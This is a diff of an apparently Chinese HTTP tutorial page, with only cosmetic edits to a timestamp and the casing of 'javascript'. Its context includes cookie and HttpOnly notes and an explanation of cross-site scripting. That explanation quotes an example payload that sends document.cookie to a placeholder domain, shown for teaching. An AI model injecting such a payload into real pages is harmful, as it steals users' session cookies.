@@ -46,7 +46,7 @@
 <meta property="og:image" content="http://7xq6al.com1.z0.glb.clouddn.com/http-8.png">
 <meta property="og:image" content="http://7xq6al.com1.z0.glb.clouddn.com/http-9.png">
 <meta property="og:image" content="http://7xq6al.com1.z0.glb.clouddn.com/http-10.png">
-<meta property="og:updated_time" content="2018-11-01T09:40:04.559Z">
+<meta property="og:updated_time" content="2018-11-11T02:02:15.871Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HTTP协议系列（一）">
 <meta name="twitter:description" content="一 、基础概念1.1 Web 基础 HTTP（HyperText Transfer Protocol，超文本传输协议）。 WWW（World Wide Web）的三种技术：HTML、HTTP、URL。 RFC（Request for Comments，征求修正意见书），互联网的设计文档。  1.2 URL URI（Uniform Resource Indentifier`，统一资源标识符） URL">
@@ -690,7 +690,7 @@
 </tr>
 <tr>
 <td style="text-align:center"><code>HttpOnly</code></td>
-<td>加以限制，使 <code>Cookie</code> 不能被 <code>JavaScript</code> 脚本访问</td>
+<td>加以限制，使 <code>Cookie</code> 不能被 <code>javascript</code> 脚本访问</td>
 </tr>
 </tbody>
 </table>
@@ -702,7 +702,7 @@
 </blockquote>
 <h3 id="5-1-6-使用-Cookie-实现用户名和密码的自动填写"><a href="#5-1-6-使用-Cookie-实现用户名和密码的自动填写" class="headerlink" title="5.1.6 使用 Cookie 实现用户名和密码的自动填写"></a>5.1.6 使用 Cookie 实现用户名和密码的自动填写</h3><ul>
 <li>网站脚本会自动从保存在浏览器中的 <code>Cookie</code> 读取用户名和密码，从而实现自动填写。</li>
-<li>但是如果 <code>Set-Cookie</code> 指定了 <code>HttpOnly</code>属性，就无法通过 <code>Javascript</code>脚本获取 <code>Cookie</code>信息，这是出于安全性考虑。</li>
+<li>但是如果 <code>Set-Cookie</code> 指定了 <code>HttpOnly</code>属性，就无法通过 <code>javascript</code>脚本获取 <code>Cookie</code>信息，这是出于安全性考虑。</li>
 </ul>
 <h2 id="5-2-缓存"><a href="#5-2-缓存" class="headerlink" title="5.2 缓存"></a>5.2 缓存</h2><h3 id="5-2-1-优点"><a href="#5-2-1-优点" class="headerlink" title="5.2.1 优点"></a>5.2.1 优点</h3><ul>
 <li>降低服务器的负担；</li>
@@ -867,7 +867,7 @@
 <li>设下圈套，让用户发送有攻击代码的 <code>HTTP</code> 请求，用户会泄露 <code>Cookie</code> 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。</li>
 </ul>
 <h2 id="7-2-跨站脚本攻击"><a href="#7-2-跨站脚本攻击" class="headerlink" title="7.2 跨站脚本攻击"></a>7.2 跨站脚本攻击</h2><h3 id="7-2-1-概念"><a href="#7-2-1-概念" class="headerlink" title="7.2.1 概念"></a>7.2.1 概念</h3><blockquote>
-<p>跨站脚本攻击（<code>Cross-Site Scripting, XSS</code>），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。</p>
+<p>跨站脚本攻击（<code>Cross-Site Scripting, XSS</code>），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 javascript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。</p>
 </blockquote>
 <p>例如有一个论坛网站，攻击者可以在上面发表以下内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
